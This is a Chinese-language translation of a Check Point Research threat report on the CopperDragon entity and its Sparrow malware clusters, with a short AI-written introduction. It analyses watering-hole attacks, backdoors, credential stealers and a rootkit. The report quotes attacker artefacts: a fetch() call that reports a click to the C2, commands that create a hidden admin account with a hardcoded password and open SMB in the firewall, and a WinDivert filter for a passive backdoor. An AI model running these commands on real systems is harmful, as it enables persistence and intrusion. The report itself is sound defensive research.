Check Point Research 追踪 CopperDragon 关联 Sparrow 框架的三个攻击集群

Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe

AI 导读

Check Point Research 经一年调查识别出 SilentDelivery、OceanGate 和 DarkWire 三个关联 Sparrow 框架的攻击集群。

值得关注

报告以共享代码与基础设施串联三个活动集群，并披露跨平台后端、凭据窃取与隐蔽通信细节，便于拆分此前混归 FamousSparrow 的入侵活动。

中文原文

要点

  • 在为期一年的调查中，Check Point Research 发现了三个不同的行动集群，横跨拉丁美洲、亚洲和欧洲，攻击电信提供商、政府机构、军事实体、研究机构和关键基础设施。
  • 这些集群——SilentDelivery、OceanGate 和 DarkWire——通过共享的基础设施特征以及 Sparrow 恶意软件框架内的恶意软件代码相似性产生了关联。
  • 我们追踪了 Sparrow 框架背后的实体，即 CopperDragon，它可能是一名数字军需官，为与中国有关的威胁行为体提供支持，包括 FamousSparrow、Earth Estries、TropicTrooper、UAT-9244 等。
  • 每个集群都采用了不同的工具集和不同的初始访问技术，包括入侵面向互联网的基础设施，以及高度选择性的水坑攻击。用于水坑攻击的被入侵网站来自政府、航运、IT 和研究领域。
  • 我们的研究揭示了此前尚未记录的数种工具，以及有关 Sparrow 框架的新细节，包括 Windows 和 Linux 变体、被动后门能力，以及与 Melofee 后门的关联。

引言

过去一年中，Check Point Research 调查了一系列入侵活动，这些活动针对拉丁美洲、亚洲和欧洲的数十家高知名度机构。这些活动最初看起来是彼此独立的行动，各自使用不同的后门、漏洞利用后工具和行动节奏。

然而，我们发现了这些工具及其基础设施之间的诸多联系，将它们关联至同一个 Sparrow 恶意软件生态系统。我们追踪了这些活动背后的实体 CopperDragon，它可能充当数字军需官，为多个使用 Sparrow 跨平台恶意软件框架（适用于 Linux 和 Windows）的中国相关威胁行为体提供支持。

什么是 CopperDragon？

FamousSparrow 是一个最早于 2021 年被发现的威胁行为体，其主要后门是 SparrowDoor。此后，多家安全厂商报道了相关活动和恶意软件变体，包括 CrowDoor、HemiGate 和 TernDoor。

随着时间推移，人们逐渐意识到，这些其他活动未必是由最初的 FamousSparrow 团伙实施。相反，报道显示有多个不同的行为体使用一套共享工具集，这些工具可能由同一实体提供。这些行为体包括 FamousSparrow、Earth Estries、TropicTrooper、UAT-9244 等。此前，FamousSparrow 也曾与 Salt Typhoon 建立联系，但双方关系的具体细节仍不清楚。基于这些行为体之间明显的工具共享情况，我们开始追踪 Sparrow 框架背后的实体 CopperDragon，它可能是该框架的开发者和供应方。

在本报告中，我们考察了三个不同的活动集群，目标包括大型电信服务提供商、政府组织和军事实体。这些行动共同呈现了与CopperDragon相关联的互联互通且不断演化的间谍活动生态的更广泛视角：

  • SilentDelivery使用高度选择性的水坑攻击，通过伪装成证书修复实用工具的木马化 MSI 安装程序分发SquadC后门。该集群主要聚焦欧洲和亚洲地区。
  • OceanGate主要针对亚洲组织，并使用SparrowDoor的一个变种。攻击者首先入侵面向互联网的 Linux 系统，随后横向移动至 Windows 环境，并针对这两种操作系统使用了一套广泛的后渗透工具。
  • DarkWire以拉丁美洲各地的电信服务提供商和政府组织为目标，主要使用CopperDoor和CopperDNS作为其后门。

SilentDelivery：选择性水坑攻击

自 2026 年初开始，我们开始追踪与CopperDragon相关的新活动，该活动引入了一种独特的初始访问方法，利用水坑攻击针对主要位于欧洲和亚洲的高知名度组织。我们将这一活动追踪为SilentDelivery行动。在我们完成本报告期间，该集群的一部分也由 Positive Technologies报告。

攻击者首先入侵其预期目标经常访问的合法网站。当受害者访问其中某个网站时，一个经过重度混淆的 JavaScript 有效载荷会被注入页面，完全将原本合法的内容替换为一条根据网站语言定制的 Google Chrome SSL 证书警告。该虚假警告阻止用户访问网站，并指示用户安装“Certificate Fix”实用工具。该实用工具会部署一个此前未公开记录、名为SquadC的后门，或在某些情况下部署SparrowDoor的一个变种。

受入侵网站

我们确认的所有受入侵网站都与政府、航运以及 IT 和研究领域有关。在一个案例中，该网站是通过对未经过滤的输入字段发起 XSS 攻击而被入侵的。根据 Check Point 遥测数据，这些行动主要针对捷克共和国、德国、法国、台湾、尼泊尔、香港和印度尼西亚等国家/地区的组织。

在所分析的网站中，我们还发现了三个据信被威胁行为者入侵的 S3 存储桶。这些存储桶托管了下一阶段的后门，当用户点击“Install certificate”按钮时便会下载该后门。

JavaScript 分析

注入受入侵网站的 JavaScript 使用jsjiami进行了重度混淆，这是一项公开可用的 JavaScript 混淆服务。它首先检查用户是否正在运行 Windows，并在某些情况下验证该网站的域名是否与预定的受入侵域名相匹配。

随后，该脚本启动一个循环，不断向位于 /image-check?t=<datetime> 的 C2（命令与控制）服务器发送状态检查请求。这些请求用于根据 IP 和地理位置对用户进行指纹识别，并确定是否继续攻击和劫持网页。它们还使威胁行为者能够控制攻击，并在成功攻陷后停止显示虚假证书错误，从而降低引起用户怀疑的可能性。如果服务器返回 HTTP 200，网页将保持不变，用户可以正常访问该网站。如果服务器没有响应，脚本就会劫持网页并显示虚假证书错误。

当用户点击“Install certificate”时，脚本会向位于 /report-url 的 C2 服务器发送 POST 请求。该请求报告此次点击，并在其 JSON 正文中包含已攻陷网站的 URL。与此同时，脚本会启动从一个由攻击者控制的 S3 存储桶下载 MSI 包的进程，该包内含下一阶段的后门。

fetch(serverUrl + "/report-url", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        url: window.location.href
    })
});

用户执行后门后，后门会向位于 /register-ip 的 C2 服务器发送请求， indicating 攻陷成功。下次用户访问已攻陷网站时，不会再出现虚假证书错误。

SquadC 后门

SquadC 是一个用 C/C++ 编写的 Windows 后门，为操作人员提供对已攻陷主机的基本远程控制能力。该后门通过一个独立的加载器组件以内存方式加载，加载器通过三阶段流程对其进行解密和加载。SquadC 这一名称源自样本中作者留下的内部引用：

根据其配置，该后门支持多个标志，其中包括一个用于启用检查以避免在沙箱环境中执行的标志。这些检查会在文件系统和 Windows 注册表中查找 VM 痕迹，同时检查列入黑名单的 MAC 地址以及特定的屏幕分辨率和磁盘大小。

作为规避沙箱和自动化分析的额外措施，该后门可配置为仅在主机上当前有浏览器运行时才执行。由于后门是在感染期间通过浏览器下载的，因此预期浏览器会保持打开。该检查通过枚举正在运行的进程名称，并将其与一份固定的浏览器列表进行比对来完成：

browser_list = [chrome.exe, msedge.exe, edge.exe, firefox.exe, brave.exe]

为了在主机重启后继续存在，该后门通过操纵某个键下的注册表 Run 键来实现持久化：WindowsUpdateAssist。

该后门支持一小组用于命令执行和文件系统管理的命令，主要作为已攻陷主机上的初始立足点。

OceanGate：从 Linux 初始访问到域管理员

OceanGate 行动于 2025-2026 年被观察到，主要针对亚洲地区的政府组织和关键基础设施。在其他地区也发现了一些活动。该行动采用了较为常见的入侵模式，其工具和操作 TTPs（战术、技术与流程）与多家供应商此前报告并跟踪为 FamousSparrow 的活动一致。

在此次攻击中，威胁行为者在 Linux 和 Windows 环境中均开展活动，部署了多个此前未曾报告的工具，以维持访问权限并在已入侵网络中进行横向移动。该行动涉及大规模凭据窃取、横向移动、数据暂存以及敏感运营信息外泄。鉴于目前关于该行为者如何在此类环境中操作以及使用哪些工具的报道有限，其 Linux 活动尤为值得关注。

Linux 行动

入侵始于利用一台暴露在互联网且存在漏洞的 Linux 服务器，随后部署了两个新型后门：AnnobinDoor 和 SparrowShell。

AnnobinDoor

初始访问后部署的第一个后门是 AnnobinDoor，这是一个静态链接、基于 Go 的后门，使用 UPX 加壳，内部名称为 annobinagent。默认使用 WebSocket，但也支持 HTTP 和原始 TCP。其请求包含类浏览器标头和标准 WebSocket 升级字段，使流量看起来类似合法的应用通信。

该后门提供广泛的远程访问和枢转能力，包括交互式 shell、文件管理、SOCKS 代理、SSH 隧道、端口转发和反向连接。

这些功能结合在一起，使受感染的 Linux 主机能够同时充当远程 shell 和内部网络枢转点。

SparrowShell

攻击稍后，攻击者还部署了我们命名为 SparrowShell 的另一个后门。SparrowShell 是一个模块化 Linux 后门，与 Windows 后门 SparrowDoor 在设计和代码上有大量相似之处。两者属于同一个跨平台恶意软件家族，均有针对 Linux 和 Windows 开发的版本。它们共用相同的 C2 基础设施和 RC4 解密密钥，也具有相似的命令行参数和可比较的基于插件的架构。

被植入木马程序的 SSH 工具

几天后，威胁行为者将服务器上合法的 SSH 客户端和 SSHD 组件替换为被植入木马的版本，设计用于在管理活动期间记录凭据。这使攻击者能够收集多个用户的凭据，并转移到网络中的其他 Linux 主机，在那里再次使用了相同技术。

公开工具

除了自定义工具和脚本外，威胁行为者还使用了 popular 的公开可用工具，包括 FRPC 和 Chisel，这些工具为远程访问和内部横向移动提供了额外通道。该行为者还使用 ASimplePortScanner，这是一款开源 Python 扫描器，用于发现网络中的其他主机。

Windows 操作

从多个用户处收集凭据并在 Linux 环境中建立稳固据点后，该行为者转移到了 Windows 环境。

该行为者尝试通过 RDP 登录多台 Windows 机器，不断尝试不同的密码，直到使用管理员账户成功完成身份验证。随后，其部署了一组自定义后渗透工具，之后部署了最终的 Windows 后门——SparrowDoor 的一个变种。

CopperAdu

CopperAdu 是一款后渗透工具，用于将已失陷的 Windows 主机配置为可远程管理，为攻击者后续活动做好准备。

它创建一个使用硬编码凭据的本地账户，禁用密码过期，并将该账户添加到本地 Administrators 组。它还会修改注册表，以在标准 Windows 登录界面中隐藏该账户。

该工具将 LocalAccountTokenFilterPolicy 设置为 1，使使用本地管理员账户建立的远程连接能够保留完整管理权限，并促进横向移动。

最后，CopperAdu 启用 LanmanServer 和 LanmanWorkstation 服务，并配置一条入站 Windows Firewall 规则，以允许 TCP 端口 445 上的 SMB 流量。

net user admin$ "Admin@123456" /add /expires:never /passwordchg:no
wmic useraccount where "Name='admin$'" set PasswordExpires=false
net localgroup administrators admin$ /add
sc config LanmanServer start= auto
sc start LanmanServer
sc config LanmanWorkstation start= auto
sc start LanmanWorkstation
netsh advfirewall firewall delete rule name = "RasiUwpApp"
netsh advfirewall firewall add rule name="RasiUwpApp" dir=in action=allow protocol=TCP localport=445 profile=any

CopperList

随后，该行为者部署了 CopperList, 这是一款 Windows 侦察工具，可收集主机信息、磁盘详细信息和递归文件清单，包括文件路径、大小和时间戳。它在扫描固定磁盘时会排除常见的系统和应用程序目录，重点关注用户数据及潜在的敏感文件。收集到的信息使用 LZNT1 压缩，并由攻击者部署的其他组件暂存以供数据外传。

CopperLogger

在部分主机上，该行为者部署了 CopperLogger，这是一款基于 Raw Input 的键盘记录器。它注册一个隐藏窗口（kbl）并订阅键盘输入事件，从而能够捕获击键内容，无论当前焦点位于哪个应用程序。

除击键记录外，该恶意软件还会收集上下文信息，包括：

  • 活动窗口标题
  • 关联的进程名称和路径
  • 用户会话上下文

此外，该恶意软件还会监控涉及复制和粘贴的剪贴板活动，并将其与击键数据一并存储。

CopperLsa

为在 Windows 系统上窃取凭据，该行为者部署了 CopperLsa，这是一款直接通过 Windows 身份验证流程收集凭据的工具。其加载器会解密两个嵌入的 DLL：一个在 LSASS 内部安装自定义 LSA 安全包，另一个则从多种身份验证机制（包括 NTLM 和 Kerberos）中收集密码、哈希和身份验证令牌。被窃取的凭据会保存至操作员选定位置的日志文件。

内核级能力

在某些情况下，我们观察到该行为体在其主要后门中添加了内核 rootkit 和内核级访问能力：适用于 Windows 的 SparrowDoor 以及适用于 Linux 的 SparrowShell。

SparrowShell 内核 rootkit

SparrowShell 支持与嵌入式内核 rootkit 集成。携带 hide 标志执行时，该后门会定位附加的加密数据块，对其进行解密，并使用 init_module 系统调用将其作为内核模块加载到内存中。

该内核组件是开源 Reptile rootkit 的修改版本，支持隐藏文件、进程和网络活动等功能。用户空间与 rootkit 之间的通信使用自定义 ioctl 接口，其 ID 为 0x0e0e0e0e。

被动式 Sparrow 后门

我们观察到，Windows 后门 SparrowDoor 的某些版本具备内核级数据包拦截能力，并为 x86 和 x64 嵌入了作为资源的 WinDivert 驱动程序。WinDivert 是一款用于网络数据包捕获和操作的合法驱动程序，常被 VPN、防火墙和隧道应用等实用程序使用。

该行为体滥用该驱动程序将 SparrowDoor 转换为被动式后门，在内核级别拦截和操作数据包，使其流量更难被发现。这使后门能够在一个端口上进行内部监听，同时通过外部可访问的端口（如已被合法服务使用的 443）接收连接。

该后门应用严格的过滤器，拦截从特定源 IP 地址发往合法服务端口的连接。它会操作数据包，并将目标端口重写为后端的内部监听端口，通常是一个高位端口，例如 49628。对于响应流量，它会将源端口重写回外部服务端口，使响应看起来源自该合法服务。

(
    (inbound and tcp.DstPort == %d       // Legitimate external listening port
        and ip.SrcAddr == %s) or         // Connections from a specific source IP
    (outbound and tcp.SrcPort == %d)     // Backdoor's internal listening port
)

传入连接会针对魔术值 0x11223344 进行检查。匹配的请求将排队进行后门命令处理，而不匹配的流量则转发至 127.0.0.1:<external_port> 处的合法服务，从而允许正常连接继续运行。

Melofee

在分析 SparrowShell 时，我们发现它与 Melofee 后门存在若干相似之处，后者于 2023 年首次被发现。两者都使用经过类似修改的开源 Reptile rootkit 版本，并且在解密、加载和激活 rootkit 的方式上具有代码相似性。二者还支持相同的 hide 和 show 命令行参数来控制 rootkit。这些相似之处促使一些厂商将 SparrowShell 归类为 Melofee。

当我们分析 Melofee 样本时，发现 Melofee 与 CopperDragon 的 SparrowShell 之间的联系变得更加密切，尤其是在其自签名证书方面，两者还具有共同的基础设施特征。二者都使用诸如 Some-State 和 O=Internet Widgits Pty Ltd 的证书主题值，并在通用名称 (CN) 字段中冒充公共 DNS 服务器。二者还使用了多年以前创建、且在过期后长期继续使用的证书。

基于这些发现，包括代码相似性和基础设施重叠，我们评估 CopperDragon 也参与维护和提供 Melofee 变种。

DarkWire：入侵电信运营商

2025 年年中，我们发现了一波新的活动，追踪编号为 DarkWire。虽然最初集中在拉丁美洲，但更近期的入侵表明其已扩张到该地区之外。受害者画像显示，其明显聚焦于电信运营商和政府实体，包括该地区至少三家主要电信运营商，以及外交和司法部门。

在整个调查过程中，我们发现了多个定制工具，表明该行为者维持着一套更广泛的专有工具库。该行为者部署了两个新发现的后门，我们命名为 CopperDoor 和 CopperDNS。它们似乎作为该组织的主要植入物，并可能已取代 SparrowDoor 系列。

除这些后门之外，还观察到该行为者部署了若干其他定制工具，包括 CopperProxy 和 PyProxy 等代理工具，以及 CopperLsass——一个用于转储 LSASS 进程以收集凭据的专用模块。包括这些新后门在内的大多数后渗透工具，均由一个独特的加载器加载，我们将其命名为 CopperLoader。

除这些工具外，操作人员还使用了公开可用的软件，例如被重命名为 vmtoolsd.exe 和 csrss.exe 等名称的 SoftEther VPN。为进行横向移动，他们通过 SMB 传输文件，并通过 WMI 执行远程命令，使用 wmiexec。

CopperLoader

CopperLoader 是一种反射式加载器，通常通过 DLL 侧加载部署。它由写入被劫持原始 DLL 改写版本中的位置无关 shellcode 组成。在某些情况下，CopperLoader 并非最初被侧加载的组件，而是作为由另一个 shellcode 加载器投递的第二阶段 shellcode 载荷到达。

CopperLoader 从其所在目录下的 .dat 文件中加载加密的下一阶段 PE 模块。这些文件以加密形式包含下一阶段模块。虽然各样本的具体布局有所不同，但一组一致的嵌入头部提供了处理每个载荷所需的信息：模块长度、RC4 解密密钥，以及在某些情况下的后门配置。

解密后的模块中 MZ 和 PE 签名已被移除，从而阻碍内存扫描和自动提取。

我们观察到 CopperLoader 投递了四种独特工具：CopperDoor、CopperDNS、CopperProxy 和 CopperLsass。

CopperDoor 与 CopperDNS

DarkWire 行动中使用的主要后门是 CopperDoor，这是一个新发现的高级模块化后门，完全驻留在内存中。CopperDoor 使用了诸如调用栈欺骗和基于 gadget 的执行等新技术来规避 EDR。该恶意软件又称 SparroWocky，最近由 ESET 作为其 FamousSparrow 活动研究的一部分深入分析。

除 CopperDoor 外，我们还观察到该后门的一个变种，它通过使用 MX 查询 的 DNS 隧道进行通信，我们将其命名为 CopperDNS。

CopperProxy & PyProxy

CopperProxy 是一款 SOCKS5 代理工具。它接受 IP 地址和 TCP 端口作为命令行参数，为指定端口配置名为 ss1 的 Windows 防火墙规则，并侦听传入连接，最多支持 300 个并发客户端。对于每个连接，它会处理 SOCKS5 协商、连接到请求的目标，并双向转发流量。

PyProxy 是一款用 Python 编写的轻量级 UDP 中继工具，并使用 PyInstaller 打包为独立可执行文件。它在固定的本地 UDP 端口上侦听，并在本地客户端与硬编码的远程 IP 地址和端口之间双向转发流量。

CopperLsass

CopperLsass 是一个 DLL 模块，它通过 RPC 将名为 slave.dll 的组件注册为安全包，从而加载到 LSASS 中。进入 LSASS 后，slave.dll 使用 Windows 库 comsvcs.dll 和辅助 DLL dep.dll 创建完整的 LSASS 内存转储，使用自定义的 SUB-XOR-ADD 算法对其进行加密，然后删除原始转储。在观察到的入侵活动中，文件在被外传前会重命名为 1.png，以伪装成图像文件。

DarkWire 基础设施

CopperDoor 基础设施展现出更高的操作安全性。相关 IP 地址分布在多种自治系统中。这些服务器通常开放 443 端口，并通过封装在 TLS 中的原始 TCP 进行通信，而非使用标准 HTTPS。在若干情况下，这些 C2 服务器部署的 TLS 证书所含通用名称（CN）值与目标受害组织关联的域名非常相似。

相比之下，与 CopperDNS 关联的基础设施主要充当 DNS 隧道 C2 通道，由基于 Windows 的主机组成。这些系统始终托管于 AS20473、AS-VULTR，开放高位端口（最常见的是 6532），并在多个节点间复用一组独特的 TLS 证书（SHA-256：ee4a8b81fe3864582efc27a77f806990e2602dcc36447ddda4b3a230a473d575）。

我们在两套基础设施中还观察到一个额外模式，即地理位置与目标区域相匹配。多数 IP 地址位于拉丁美洲，通常与受害组织位于同一国家。这种地理邻近性可能有助于恶意流量混入合法网络活动，并降低被发现的可能性。

DarkWire 归因

除了一般的设计模式外，我们未在 DarkWire cluster 与 CopperDragon 工具集中的其他工具之间发现直接的代码相似性。不过，我们发现其基础设施与此前关于 FamousSparrow 活动的一份报告存在关联。域名 amelicen[.]com 曾被报告为 SparrowDoor C2 服务器，而我们的遥测数据显示，同一域名也是 CopperDNS 基础设施的一部分。

我们还观察到 VirusTotal 的提交者在大致相同的时间上传了与 SparrowDoor 和 DarkWire 均相关的文件，这表明这些工具可能曾用于同一次攻击。在最近的一份报告中，ESET 还观察到，在已受感染的计算机上，SparrowDoor 被 CopperDoor（又称 SparroWocky）所替换，这进一步印证了我们发现的关联。

摘要

CopperDragon 是我们持续跟踪的一个实体，可能是支持多个中国关联威胁行为体的数字军需官，这些行为体使用跨平台的 Sparrow 框架。

我们识别出至少三个活动集群，每个集群都使用自己的主后门，并针对不同的地区和组织：

  • SilentDelivery – 在欧洲和亚洲的水坑攻击中使用新发现的 SquadC 以及 SparrowDoor 的一个变种。
  • OceanGate – 主要在亚洲活动，使用 SparrowDoor 和 SparrowShell 的变种，并可能与 Melofee 存在关联。
  • DarkWire – 针对拉丁美洲的电信运营商和政府组织，使用新的 CopperDoor 和 CopperDNS 后门。

这些发现为理解 CopperDragon 的潜在使用者，以及更精确地跟踪此前被归入 FamousSparrow 名下的活动奠定了基础。在高度互联的中国关联威胁生态中，共享的恶意软件和基础设施可能会模糊不同运营方和活动之间的界限。然而，使用相同的后门或 C2 基础设施并不一定意味着两次入侵是由同一行为体实施的。
